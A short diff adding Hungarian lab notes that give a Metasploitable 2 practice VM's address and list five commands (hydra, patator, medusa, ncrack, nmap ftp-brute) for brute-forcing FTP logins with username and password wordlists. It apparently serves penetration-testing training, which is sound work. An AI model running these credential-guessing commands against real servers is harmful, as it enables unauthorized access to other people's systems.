@@ -1,0 +1,8 @@
+A Metasploitable 2 VM IP címe: 192.168.56.254
+
+FTP belépési adatok keresése:
+1. hydra -L users -P passwords 192.168.56.254 ftp
+2. patator ftp_login host=192.168.56.254 user=FILE0 0=users password=FILE1 1=passwords
+3. medusa -h 192.168.56.254 -U users -P passwords -M ftp
+4. ncrack –v -U users -P passwords 192.168.56.254:21
+3. sudo nmap -p21 --script ftp-brute.nse --script-args userdb=users,passdb=passwords 192.168.56.254
